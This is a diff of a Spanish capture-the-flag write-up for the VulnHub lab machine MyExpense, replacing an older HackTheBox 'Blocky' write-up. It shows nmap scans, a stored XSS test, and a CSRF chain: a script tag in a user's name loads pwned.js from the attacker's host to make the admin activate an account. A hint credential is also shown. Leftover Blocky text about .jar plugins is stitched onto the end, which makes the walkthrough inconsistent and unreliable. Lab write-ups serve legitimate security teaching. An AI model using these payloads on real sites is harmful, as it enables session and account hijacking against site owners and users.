@@ -24,125 +24,134 @@ MyExpense es una máquina linux de [VulnHub](https://www.vulnhub.com/entry/myexp
 
 En este caso, somos un "Samuel Lamotte", exempleado de una empresa la cual nos ha despedido y encima, no nos han tramitado un pago que nos deben. Nuestro objetivo será infiltrarnos en el sistema para que el pago se lleve a cabo.
 
+La única pista que nos dan es: ```samuel/fzghn4lw```, lo cual parecen unas credenciales.
+
 ## Índice
 * [Fase de reconocimiento](#reconocimiento)
   * [Reconociento de puertos y servicios](#reconocimiento)
   * [Reconocimiento de la página web](#reconocimiento-web)
-  * [Fuzzing de la web](#fuzzing)
 * [Fase de explotación](#explotacion)
-* [Escalada de pivilegios](#escalada)
+  * [Nos logeamos como slamotte](#slamotte)
+  * [Nos convertimos en mriviere](#mriviere)
+  * [Nos convertimos en pboundi](#pboundi)
 
 <a id="reconocimiento"></a>
 ## Fase de reconocimiento
 
 ### Reconocimiento de puertos y servicios
 
-
 Empezaremos utilizando nmap para descubrir los puertos abiertos accesibles(digo accesibles ya que la máquina puede tener más puertos abiertos pero que solo son accesibles desde la misma).
 ```bash
-nmap -p- -sS --min-rate 5000 --open -Pn -n -vvvv 10.10.10.37 -oN writeup-scan-ports
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 15:40 CEST
-Initiating SYN Stealth Scan at 15:40
-Scanning 10.10.10.37 [65535 ports]
-Discovered open port 80/tcp on 10.10.10.37
-Discovered open port 21/tcp on 10.10.10.37
-Discovered open port 22/tcp on 10.10.10.37
-Discovered open port 25565/tcp on 10.10.10.37
-Completed SYN Stealth Scan at 15:40, 30.42s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.37
-Host is up, received user-set (1.1s latency).
-Scanned at 2021-09-24 15:40:00 CEST for 30s
-Not shown: 65530 filtered ports, 1 closed port
-Reason: 65530 no-responses and 1 reset
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT      STATE SERVICE   REASON
-21/tcp    open  ftp       syn-ack ttl 63
-22/tcp    open  ssh       syn-ack ttl 63
-80/tcp    open  http      syn-ack ttl 63
-25565/tcp open  minecraft syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 30.51 seconds
-           Raw packets sent: 131081 (5.768MB) | Rcvd: 30 (1.312KB)
+nmap -p- --open -sS --min-rate 5000 -Pn -n -v 10.0.2.9 -oG allPort
 ```
+allPorts:
 
-Como podemos observar, hay varios puertos interesantes. En el puerto 21 corre un servicio *ftp*. Esto nos daría la idea de probar si nos pudieramos identificar con el usuario anonymous y sin contraseña pero en este caso no funciona. También hay un servicio *ssh* que puede que nos sirva de ayuda más adelante, un servicio *http* donde se encuentra la página web y por último pero no menos importante, un servidor de minecraft. Este último nos da una pequeña pista de lo que tendremos que hacer después aunque no utilicemos este puerto.
+```bash 
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.0.2.9 ()   Status: Up
+Host: 10.0.2.9 ()   Ports: 80/open/tcp//http///, 37761/open/tcp/////, 41843/open/tcp/////, 42307/open/tcp/////, 53407/open/tcp///// Igno
+red State: closed (65530)
+# Nmap done at Mon Oct 23 18:02:42 2023 -- 1 IP address (1 host up) scanned in 2.72 seconds
+```
 
 Una vez escaneados los puertos, escanearemos más en profundidad para ver que servicios usan y sus respectivas versiones.
 
 ```bash
-nmap -sC -sV -p21,22,80,25565 -oN targeted 10.10.10.37
-Nmap scan report for 10.10.10.37
-Host is up (0.054s latency).
+nmap -p80,37761,41843,42307,53407 -sCV 10.0.2.9 -v -oN targeted
+# Nmap 7.93 scan initiated Mon Oct 23 18:04:16 2023 as: nmap -p80,37761,41843,42307,53407 -sCV -v -oN targeted 10.0.2.9
+Nmap scan report for 10.0.2.9 (10.0.2.9)
+Host is up (0.00069s latency).
 
-PORT      STATE SERVICE   VERSION
-21/tcp    open  ftp       ProFTPD 1.3.5a
-22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
-|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
-|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
-80/tcp    open  http      Apache httpd 2.4.18 ((Ubuntu))
-|_http-generator: WordPress 4.8
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: BlockyCraft &#8211; Under Construction!
-25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Futura Business Informatique GROUPE - Conseil en ing\xC3\xA9nierie
+|_http-favicon: Unknown favicon MD5: 9B033BAF87652377BA32FF57F736E439
+|_http-server-header: Apache/2.4.25 (Debian)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/admin/admin.php
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+37761/tcp open  http    Mongoose httpd
+|_http-title: Site doesn't have a title (text/plain).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+41843/tcp open  http    Mongoose httpd
+|_http-title: Site doesn't have a title (text/plain).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+42307/tcp open  http    Mongoose httpd
+|_http-title: Site doesn't have a title (text/plain).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+53407/tcp open  http    Mongoose httpd
+|_http-title: Site doesn't have a title (text/plain).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
 
+Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Fri Sep 24 13:19:42 2021 -- 1 IP address (1 host up) scanned in 11.28 seconds
-
+# Nmap done at Mon Oct 23 18:04:23 2023 -- 1 IP address (1 host up) scanned in 7.26 seconds
 ```
 
-Lo más importante que hay que destacar del escaneo es que el servidor utiliza un Wordpress de version 4.8. Sin embargo, si buscamos exploits de esta version o utilizamos herramientas como wpscan nos daremos cuenta de que no existe ninguna vía potencial de explotación. Al igual pasa con el servicio ProFTPD 1.3.5a.
+Como podemos ver, el servidor tiene el puerto 80 con el servicio *http*. Es más, ha encontrado una ruta llamada ```/admin/admin```.php que tiene una cookie de *PHPSESSION* que tiene el http-only deshabilitado.
+
+Esta flag puede ser crucial si se produce un [XSS (Cross Site Scripting)](https://owasp.org/www-community/attacks/xss/), ya que nos puede permitir hacer un [Session Hijacking](https://en.wikipedia.org/wiki/Session_hijacking).
+
 
 <a id="reconocimiento-web"></a>
 ### Reconocimiento de la página web
 
-
-Una vez habiendo escaneado al servidor, es hora de analizar la página manualmente. Como tiene un servicio http corriendo en el puerto 80 apuntamos a la dirección de la máquina desde nuestro navegador.
-
-![](/assets/images/htb-writeup-blocky/pg-principal.PNG)
-
-Tras no encontrar ninguna vulnerabilidad en el wordpress y haber trasteado con la página web, la única información de valor que podemos obtener es la del nombre de un usuario: ```notch```. Sin embargo, si intentamos logearnos con credenciales por defecto como 1234 o admin como contraseña o incluso si aplicamos fuerza bruta con el diccionario de *rockyou.txt* no conseguimos nada. A estas alturas lo mejor es ir en busca de directorios ocultos en el sitio web.
-
-<a id="fuzzing"></a>
-### Fuzzing de la web
-
-Para fuzzear la página he utilizado la herramienta wfuzz con el diccionario directory-list-2.3-medium de dirbuster:
-
-```bash
-
-wfuzz -c --hw=3592 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.10.37/FUZZ
- 
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.37/FUZZ
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload        
-=====================================================================
-
-000000190:   301        9 L      28 W       309 Ch      "wiki"                            
-000000241:   301        9 L      28 W       315 Ch      "wp-content"                           
-000000519:   301        9 L      28 W       312 Ch      "plugins"                                
-000000786:   301        9 L      28 W       316 Ch      "wp-includes"                    
-000001073:   301        9 L      28 W       315 Ch      "javascript"
-000007180:   301        9 L      28 W       313 Ch      "wp-admin"                               
-000010825:   301        9 L      28 W       315 Ch      "phpmyadmin"
-```
-
-Como podemos observar, hay una ruta llamada plugins. 
+Podemos acceder a la página ```/admin/admin.php``` sin logearnos en la página y podemos ver una serie de usuario y si están activos o no.
 
 <a id="explotacion"></a>
 
-![](/assets/images/htb-writeup-blocky/plugins.PNG)
-
 ## Fase de explotación
+
+Entre estos usuarios podemos ver al nuestro: slamotte. Sin embargo, si intentamos logearnos nos dice que no podemos entrar en esta porque está inactiva.
+
+Por lo tanto intentamos crear una nueva, pero por defecto aparece inactiva.
+
+Como el login nos permite escribir un input que luego se refleja en ```/admin/admin.php```, intentamos probar un **XSS**. Creamos un usuario con el FirstName: ```<marquee>Hacked</marquee>```. Cuando vamos a *admin.php* podemos ver que se mueve el texto. Por lo tanto, estamos ante un **XSS**.
+
+Si le damos a activar una cuenta, nos redirigirá a una página diciendo que no tenemos privilegios para hacerlo. Esta petición se hace por *GET* y podemos ver en la URL que se tramita de la siguiente manera: 
+```
+http://<ip de la maquina>/admin/admin.php?id=11&status=active
+```
+El campo id es el id del usuario al que queremos activar y el status es al estado al que queremos cambiarlo.
+
+<a id="slamotte"></a>
+### Nos logeamos como en slamotte
+
+Si logramos que el administrador realice esta petición activará la cuenta. Esto lo podremos conseguir derivando el **XSS** anterior en un [CSRF(Cross Site Request Forgery)](https://owasp.org/www-community/attacks/csrf).
+
+La idea es que vamos a hacer que el administrador cargue un código malicioso *js* gracias al **XSS**. Este script va a realizar una petición XML a la URL de activarnos la cuenta con suerte de que la ejecute un administrador.
+
+pwned.js:
+
+```js
+var request = new XMLHttpRequest();
+request.open('GET', 'http://<ip de la máquina>/admin/admin.php?id=11&status=active');
+request.send();
+```
+
+Ahora creamos un usuario con el siguiente FirstName:
+```html
+<script src="http://<mi ip>/pwned.js"></script>
+```
+
+Iniciamos un servicio *http* en la carpeta en la que tenemos el archivo. Yo lo hago con python desde consola de la siguiente manera:
+```py
+python -m http.server 80
+```
+
+En un momento dado, vemos que hemos recibido una petición *GET* del recurso ```/pwned.js```. Si recargamos la página vemos que el usuario **slamotte** está activo y nos logueamos con las credenciales que teníamos. 
+
+![](/assets/images/vh-writeup-myexpense/slamotte.png)
+
 
 Descarguémonos los plugins para ver que contienen. Como .jar es una extensión de un archivo comprimido los descomprimimos con ```unzip [nombre del archivo]```. 
 Una vez hecho esto nos centraremos en el plugin *BlockyCore.class* que se encuentra dentro de la carpeta ```com->myfirstpuglin```.
